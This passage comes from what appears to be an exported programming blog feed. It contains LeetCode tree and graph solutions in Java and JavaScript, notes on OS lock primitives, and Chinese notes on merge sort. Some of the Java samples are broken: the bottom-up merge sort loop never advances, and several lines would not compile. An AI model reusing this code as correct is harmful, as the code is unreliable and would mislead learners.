  &#x2F;&#x2F; if find, return initial node which has most contributions, else return the node has smallest index in initial</span><br><span class="line">        Arrays.sort(initial);</span><br><span class="line">        int res &#x3D; initial[0], max &#x3D; 0;</span><br><span class="line">        for(int i &#x3D; 0; i &lt; contributions.length; i++) &#123;</span><br><span class="line">            if(contributions[i] &gt; max)&#123;</span><br><span class="line">                res &#x3D; i;</span><br><span class="line">                max &#x3D; contributions[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void dfs(int[][] graph, int[] clean, Set&lt;Integer&gt; seen, int v) &#123;</span><br><span class="line">        for(int j &#x3D; 0; j &lt; graph[v].length; j++) &#123;</span><br><span class="line">            if(graph[v][j] &#x3D;&#x3D; 1 &amp;&amp; clean[j] &#x3D;&#x3D; 1 &amp;&amp; !seen.contains(j)) &#123;</span><br><span class="line">                seen.add(j);</span><br><span class="line">                dfs(graph, clean, seen, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>graph</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-94</title>
    <url>/2019/01/22/leetcode-94/</url>
    <content><![CDATA[<h1 id="Binary-Tree-Inorder-Traversal"><a href="#Binary-Tree-Inorder-Traversal" class="headerlink" title="Binary Tree Inorder Traversal"></a>Binary Tree Inorder Traversal</h1><p>Given a binary tree, return the inorder traversal of its nodes’ values.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    &#x2F;</span><br><span class="line">   3</span><br></pre></td></tr></table></figure>
<p>Output: [1,3,2]<br>Follow up: Recursive solution is trivial, could you do it iteratively?</p>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>实现中序遍历二叉树。最简单是递归版本，然后设计一个迭代版本。迭代版本中我们设置一个栈，用来存放我们看到过的结点，当到达树最左侧结点时，就将当前结点出栈，并检查最左侧结点是否存在右子树，如果有我们需要以同样的方法迭代右子树。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;TreeNode&#125;</span> <span class="variable">root</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;number[]&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    helper(root, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helper</span>(<span class="params">root, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(root.left !== <span class="literal">null</span>) &#123;</span><br><span class="line">            helper(root.left, res);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push(root.val);</span><br><span class="line">        <span class="keyword">if</span>(root.right !== <span class="literal">null</span>) &#123;</span><br><span class="line">            helper(root.right, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>递推方程是T(n) = 2 * T(n / 2) + 1，时间复杂度为O(n)。空间复杂度最坏情况为O(n)，当树向一侧倾斜时出现。而平均情况下，空间复杂度为O(log(n))。</p>
<p>迭代版本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;TreeNode&#125;</span> <span class="variable">root</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;number[]&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> stack = [];</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">var</span> curr = root;</span><br><span class="line">    <span class="keyword">while</span>(curr !== <span class="literal">null</span> || stack.length !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(curr !== <span class="literal">null</span>) &#123;</span><br><span class="line">            stack.push(curr)</span><br><span class="line">            curr = curr.left;</span><br><span class="line">        &#125;</span><br><span class="line">        curr = stack.pop();</span><br><span class="line">        res.push(curr.val);</span><br><span class="line">        curr = curr.right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>因为要遍历到所有节点，时间复杂度为O(n)，额外用了一个栈，空间复杂度为O(n)。</p>
<p>第三种方案是利用线索二叉树。</p>
<ul>
<li>用root初始化current</li>
<li>while current不空：<ul>
<li>如果current没有左子树，push进current的值，然后current指向右子树</li>
<li>否则有左子树，找到current左子树的最右侧节点，将current作为这个节点的右子树。</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;TreeNode&#125;</span> <span class="variable">root</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;number[]&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> curr = root;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">while</span>(curr !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curr.left === <span class="literal">null</span>) &#123;</span><br><span class="line">            res.push(curr.val);</span><br><span class="line">            curr = curr.right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> pre = curr.left;           </span><br><span class="line">            <span class="keyword">while</span>(pre.right !== <span class="literal">null</span>) pre = pre.right;</span><br><span class="line">            <span class="keyword">var</span> temp = curr;</span><br><span class="line">            pre.right = curr;</span><br><span class="line">            curr = temp.left;</span><br><span class="line">            temp.left = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>时间复杂度和空间复杂度都为O(n)。</p>
<p>该方法的策略就是用中序遍历的次序重新构建一个线索树。</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>tree</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-99</title>
    <url>/2019/01/22/leetcode-99/</url>
    <content><![CDATA[<h1 id="Recover-Binary-Search-Tree"><a href="#Recover-Binary-Search-Tree" class="headerlink" title="Recover Binary Search Tree"></a>Recover Binary Search Tree</h1><p>Two elements of a binary search tree (BST) are swapped by mistake.</p>
<p>Recover the tree without changing its structure.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [1,3,null,null,2]</span><br><span class="line"></span><br><span class="line">   1</span><br><span class="line">  &#x2F;</span><br><span class="line"> 3</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line"></span><br><span class="line">Output: [3,1,null,null,2]</span><br><span class="line"></span><br><span class="line">   3</span><br><span class="line">  &#x2F;</span><br><span class="line"> 1</span><br><span class="line">  \</span><br><span class="line">   2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [3,1,4,null,null,2]</span><br><span class="line"></span><br><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">1   4</span><br><span class="line">   &#x2F;</span><br><span class="line">  2</span><br><span class="line"></span><br><span class="line">Output: [2,1,4,null,null,3]</span><br><span class="line"></span><br><span class="line">  2</span><br><span class="line"> &#x2F; \</span><br><span class="line">1   4</span><br><span class="line">   &#x2F;</span><br><span class="line">  3</span><br></pre></td></tr></table></figure>
<p>Follow up:</p>
<ul>
<li>A solution using O(n) space is pretty straight forward.</li>
<li>Could you devise a constant space solution?</li>
</ul>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>给定一个二叉搜索树，其中两个节点的位置被错误放置。让我们找到这两个节点并将其交换使之成为一个合法的二叉搜索树。分析可知，二叉搜索树的中序遍历应该是递增序的，我们将给定输入的树进行中序遍历，有两种可能存在的情况：其一是两个错误的元素紧邻放置，那么中序遍历的结果中只有这两个错误的邻居元素是逆序的；其二是两个错误的元素不相邻，那么中序遍历结果中会存在两个逆序。如<code>3 25 7 8 10 15 20 5</code>，其中的25和5，这两个需要做交换使之成为<code>3 5 7 8 10 15 20 25</code>。其中25和5是应当做交换的非紧邻元素，那么我们可以发现25大于7，20大于5这两对逆序，并取第一个逆序的第一个元素和第二个逆序的第二个元素做交换。而在<code>3 5 8 7 10 15 20 25</code>这一个紧邻元素需要做交换的例子中，我们并不存在第二个逆序对，所以只需要找到唯一的逆序对，将其做交换即可。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;TreeNode&#125;</span> <span class="variable">root</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;void&#125;</span> </span>Do not return anything, modify root in-place instead.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// first指向第一个逆序对的第一个元素，middle指向第一个逆序对的第二个元素，last指向第二个逆序对的第二个元素</span></span><br><span class="line"><span class="keyword">var</span> first, middle, last, prev;</span><br><span class="line"><span class="keyword">var</span> recoverTree = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    first = middle = last = prev = <span class="literal">null</span>;</span><br><span class="line">    correct(root);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// last存在代表有两个逆序对，这时候middle也是存在的，需要严格按照这个顺序</span></span><br><span class="line">    <span class="keyword">if</span>(first != <span class="literal">null</span> &amp;&amp; last != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp = first.val;</span><br><span class="line">        first.val = last.val;</span><br><span class="line">        last.val = temp;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(first != <span class="literal">null</span> &amp;&amp; middle != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp = first.val;</span><br><span class="line">        first.val = middle.val;</span><br><span class="line">        middle.val = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">correct</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root != <span class="literal">null</span>) &#123;</span><br><span class="line">        correct(root.left);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(prev != <span class="literal">null</span> &amp;&amp; prev.val &gt; root.val) &#123;</span><br><span class="line">            <span class="keyword">if</span>(first == <span class="literal">null</span>) &#123;</span><br><span class="line">                first = prev;</span><br><span class="line">                middle = root;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                last = root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        prev = root;</span><br><span class="line">        correct(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>tree</tag>
      </tags>
  </entry>
  <entry>
    <title>locks</title>
    <url>/2020/06/07/locks/</url>
    <content><![CDATA[<h2 id="Evaluate-Lock"><a href="#Evaluate-Lock" class="headerlink" title="Evaluate Lock"></a>Evaluate Lock</h2><ol>
<li>The first is whether the lock does its basic task, which is to provide mutual exclusion.</li>
<li>The second is fairness. Does each thread contending for the lock get a fair shot at acquiring it once it is free? Another way to look at this is by examining the more extreme case: does any thread contending for the lock starve while doing so, thus never obtaining it?</li>
<li>The final criterion is performance, specifically the time overheads added by using the lock.<ol>
<li>One is the case of no contention; when a single thread is running and grabs and releases the lock.</li>
<li>Multiple threads are contending for the lock on a single CPU; in this case, are there performance concerns?</li>
<li>There are multiple CPUs involved, and threads on each contending for the lock?</li>
</ol>
</li>
</ol>
<h2 id="Control-Interupt"><a href="#Control-Interupt" class="headerlink" title="Control Interupt"></a>Control Interupt</h2><ul>
<li>How: disable interrupts for critical sections by using hardware instruction as if iy were atomic. When finished, re-enable interrupts(via hardware instruction).</li>
<li>What: single-processor systems</li>
<li>Code:<br>  <img src="https://s1.ax1x.com/2020/06/06/tgp9dH.png" alt="image"><a id="more"></a></li>
<li>Positive: Simplicity</li>
<li>Negative: <ol>
<li>require to allow any calling thread to perform a privileged operation(turning on and off interrupts) and too much trust in applications.</li>
<li>not work on multiprocessors. If multiple threads are running on different CPUs, doesn&#39;t matter whether interrupts are disavled. Multiple processors are now commonplace, need a general solution.</li>
<li>lead to interrupts being lost.</li>
<li>least importantly, inefficient.</li>
</ol>
</li>
</ul>
<p>For these reasons, the method is only used in limited contexts. For example, when OS accesses its own data structures. Because trust issue disappears inside the OS. </p>
<h2 id="Failed-attempt-just-using-load-store"><a href="#Failed-attempt-just-using-load-store" class="headerlink" title="Failed attempt: just using load/store"></a>Failed attempt: just using load/store</h2><p><img src="https://s1.ax1x.com/2020/06/07/t2Pzzn.png" alt="t2Pzzn.png"></p>
<ul>
<li>How: use a simple variable(flag) to indicate whether a lock is available or not. A thread calls <code>lock()</code>, sets the flag to 1 to indicate it holds the lock. If finished, call <code>unlock()</code>, the flag is set to 0 to indicate it doesn&#39;t possess the lock. If B calls <code>lock()</code> when A holds the lock, the it will simply <strong>spin-wait</strong>. Until A calls <code>unlock()</code>, B whill quit the loop and set the flag.</li>
<li>Problems:<ol>
<li>Correctness: see the picture below. Assuming flag begins with 0. We do not provide mutual exclusion. Both threads set the flag to 1 and can enter the critical section.<br><img src="https://s1.ax1x.com/2020/06/07/t2Fi6I.png" alt="t2Fi6I.png"></li>
<li>Performance: the way a thread waits to acquire a lock that is alread held in this attempt is <strong>spin-waiting</strong>. It endlessly checks the value of flag. Waste too much time waiting for the other thread to release a lock. We should avoid the kind of waste.</li>
</ol>
</li>
</ul>
<h2 id="Building-working-spin-locks-with-test-and-set"><a href="#Building-working-spin-locks-with-test-and-set" class="headerlink" title="Building working spin locks with test-and-set"></a>Building working spin locks with test-and-set</h2><ul>
<li>How: By hardware supporting, which is known as <strong>test-and-set</strong>(or <strong>atomic exchange</strong> instruction). It does the following things.The key, of course, is that this sequence of operations is performed <strong>atomically</strong>.<br><img src="https://s1.ax1x.com/2020/06/07/t2AEFS.png" alt="t2AEFS.png"><br><img src="https://s1.ax1x.com/2020/06/07/t2Zko6.png" alt="t2Zko6.png"></li>
</ul>
<h2 id="Evaluate-spin-locks"><a href="#Evaluate-spin-locks" class="headerlink" title="Evaluate spin locks"></a>Evaluate spin locks</h2><ul>
<li>Correctness: the spin lock only allows a single thread to enter the critical section at a time.</li>
<li>Fairness: simple spin locks discussed thus far may be not fair and lead to starvation.</li>
<li>Performance: <ul>
<li>single CPU: performance overheads can be quite painful. If the thread holding the lock is preempted within a critical section, then the scheduler might run every other thread, each of which tries to get the lock. Each thread will spin for the duration of a time slice before giving up the CPU.</li>
<li>multiple CPUs: work reasonably well(if number of thread equals the number of CPUs). Spinning to wait for a lock held on another processor does not waste many cycles, thus can be effective.</li>
</ul>
</li>
</ul>
<h2 id="Compare-And-Swap"><a href="#Compare-And-Swap" class="headerlink" title="Compare-And-Swap"></a>Compare-And-Swap</h2><ul>
<li><p>what: hardware primitive that some systems provide, which is called <strong>compare-and-swap</strong> on SPARC, or <strong>compare-and-exchange</strong> on x86. Following is C pseudocode. Replace <code>lock()</code> routine as following.<br><img src="https://s1.ax1x.com/2020/06/07/t2oo9g.png" alt="t2oo9g.png"><br><img src="https://s1.ax1x.com/2020/06/07/t2Tn8e.png" alt="t2Tn8e.png"></p>
</li>
<li><p>characteristic: more powerful than test-and-set. Using the power when delving into <strong>lock-free synchronization</strong>. If simplely build spin lock, then it&#39;s identical to the spin lock above.</p>
</li>
</ul>
<h2 id="Load-Linked-and-Store-Conditional"><a href="#Load-Linked-and-Store-Conditional" class="headerlink" title="Load-Linked and Store-Conditional"></a>Load-Linked and Store-Conditional</h2><ul>
<li><p>what: A pair of instructions that work in concert to help build critical sections. Which on MIPS architecture, are the <strong>load-linked</strong> and <strong>store-conditional</strong> instructions. The following is C pseudocode for these instructions.<br><img src="https://s1.ax1x.com/2020/06/07/tRpEy6.png" alt="tRpEy6.png"></p>
</li>
<li><p>characteristic: The key difference comes from <strong>store-conditional</strong>, which only succeeds and updates the value stored at the address just <strong>load-linked</strong> from if no intervening store to the address has taken place. If suceess, updates the value at ptr and return 1. If fail, then not update and 0 is returned.</p>
</li>
<li><p>lock:<br>  <img src="https://s1.ax1x.com/2020/06/07/tRiMHf.png" alt="tRiMHf.png"></p>
<ul>
<li>success: A thread spins waiting for the flag to be set to 0. Once done, the thread tries to acquire the lock via the store-conditional. If succeeds, the thread has atomically changed the flag’s value to 1 and thus can proceed to the critical section.</li>
<li>failure: A thread calls <code>lock()</code> and <code>LoadLinked()</code> returns 0 because the lock is not held. Then it is be interupted before it attempt the <code>StoreConditional()</code>. B thread enters <code>lock</code> code and executes the <code>LoadLinked</code> and also gets 0. The two both attempt the <code>StoreConditional</code>, but one of them can succeed, because when one thread succeeds, it must change the value of address <code>ptr</code>, so the other thread can not update and will try again.</li>
<li>A more concise code as following.<br><img src="https://s1.ax1x.com/2020/06/07/tRFEZV.png" alt="tRFEZV.png"></li>
</ul>
</li>
</ul>
<h2 id="Fetch-And-Add"><a href="#Fetch-And-Add" class="headerlink" title="Fetch-And-Add"></a>Fetch-And-Add</h2><ul>
<li>what: harware primitive which atomically increments a value while returning the old value at a particular address. The C pseudocode is as following.<br><img src="https://s1.ax1x.com/2020/06/08/tRgIR1.png" alt="tRgIR1.png"></li>
</ul>
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>concurrency</tag>
      </tags>
  </entry>
  <entry>
    <title>merge-sort</title>
    <url>/2018/12/01/merge-sort/</url>
    <content><![CDATA[<h2 id="归并操作"><a href="#归并操作" class="headerlink" title="归并操作"></a>归并操作</h2><p>归并排序算法的核心是归并操作，给定两个有序的数组，将其归并为一个更大的有序的数组。以下是归并操作的java实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> mid, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 辅助数组</span></span><br><span class="line">    Comparable[] aux = <span class="keyword">new</span> Comparable[a.length];</span><br><span class="line">    <span class="comment">// 用两个指针标识位置</span></span><br><span class="line">    <span class="keyword">int</span> i = lo, j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 将数组内容复制到aux数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = lo; k &lt;= hi; k++)</span><br><span class="line">        aux[k] = a[k];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = lo; k &lt;= hi; k++) &#123;</span><br><span class="line">        <span class="comment">// 左半边遍历完成</span></span><br><span class="line">        <span class="keyword">if</span>(i &gt; mid) a[k] = aux[j++];</span><br><span class="line">        <span class="comment">// 右半边遍历完成</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j &gt; hi) a[k] = aux[i++];</span><br><span class="line">        <span class="comment">// 右半边元素小于左半边，放置小的至原数组</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(aux[i] &gt; aux[j]) a[k] = aux[j++];</span><br><span class="line">        <span class="keyword">else</span> a[k] = aux[i++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="自顶向下归并"><a href="#自顶向下归并" class="headerlink" title="自顶向下归并"></a>自顶向下归并</h2><p>我们利用算法设计中的分治思想去设计归并排序，拿到一个无序数组，可以这样思考，将其左半边排序，右半边排序，然后将左右两侧归并，就可以实现整个数组的排序。这样将大的数组分为若干小数组，将其分别排序归并，最后形成有序的大数组，就可以实现我们的目的，这种通过递归实现的排序方法叫做自顶向下的归并排序。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Merge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Comparable[] aux;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a)</span> </span>&#123;</span><br><span class="line">        aux = <span class="keyword">new</span> Comparable[a.length];</span><br><span class="line">        sort(a, <span class="number">0</span>, a.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">        sort(a, lo, mid);</span><br><span class="line">        sort(a, mid + <span class="number">1</span>, hi);</span><br><span class="line">        merge(a, lo, mid, hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sort()方法的作用就是安排merge方法调用的正确顺序。我们通过分析算法的比较次数来分析这个算法的复杂度，对于下面的树来说，我们有n层，自顶向下的第k层有2^k个子数组，每个数组长度为$2^(n-k)$，归并需要2$^(n-k)$次比较。因此每层的比较次数为$2^n$，并且这里我们有n层（$n=logn$)，所以为$NlogN$。</p>


<p>归并排序改进</p>
<ul>
<li>对小规模子数组使用插入排序，<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(hi &lt;= lo + CUTOFF - <span class="number">1</span>) &#123;</span><br><span class="line">        Insertion.sort(a, lo, hi);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">    sort(a, lo, mid);</span><br><span class="line">    sort(a, mid + <span class="number">1</span>, hi);</span><br><span class="line">    merge(a, lo, mid, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>测试数组是否已经有序：如果数组已经有序，也就是a[mid] &lt; a[mid + 1]，就跳过merge方法。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(hi &lt;= lo) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">    sort(a, lo, mid);</span><br><span class="line">    sort(a, mid + <span class="number">1</span>, hi);</span><br><span class="line">    <span class="keyword">if</span>(less(a[mid], a[mid + <span class="number">1</span>])) <span class="keyword">return</span>;</span><br><span class="line">    merge(a, lo, mid, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>交换aux和a数组：节省时间但不节省空间<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Comparable[] a, Comparable[] aux, <span class="keyword">int</span> lo, <span class="keyword">int</span> mid, <span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = lo, j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = lo; k &lt;= hi; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i &gt; mid) aux[k] = a[j++];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j &gt; hi) aux[k] = a[i++];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i] &lt; a[j]) aux[k] = a[i++];</span><br><span class="line">        <span class="keyword">else</span> aux[k] = a[j++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, Comparable[] aux, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">    sort(aux, a, lo, mid);</span><br><span class="line">    sort(aux, a, mid + <span class="number">1</span>, hi);</span><br><span class="line">    merge(a, aux, lo, mid, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="自底向上归并排序"><a href="#自底向上归并排序" class="headerlink" title="自底向上归并排序"></a>自底向上归并排序</h2><p>递归实现归并排序是分治算法的典型体现，我们将大问题分解为小问题，再逐个击破。另一种实现归并排序的思路是，我们通过$log N$轮的归并，设定一个sz值，这个sz值不断翻倍，先将小的sz为1的子数组归并为规模为2的有序数组，再将sz为2的有序数组归并，为sz为4的归并做准备，以此类推，我们将这种方法叫做自底向上的归并排序。需要注意的是，最后一个参与归并的子数组可能与前面参与归并的数组大小不一致，但我们的merge方法也能很好的处理这种情况。</p>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeBU</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Comparable[] aux;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> N = a.length;</span><br><span class="line">        aux = <span class="keyword">new</span> Comprable[N];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sz = <span class="number">1</span>; sz &lt; N; sz += sz)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> lo = <span class="number">0</span>; lo &lt; N - sz; lo += lo)</span><br><span class="line">                merge(a, lo, lo + sz - <span class="number">1</span>, Math.min(lo + sz + sz - <span class="number">1</span>, N - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
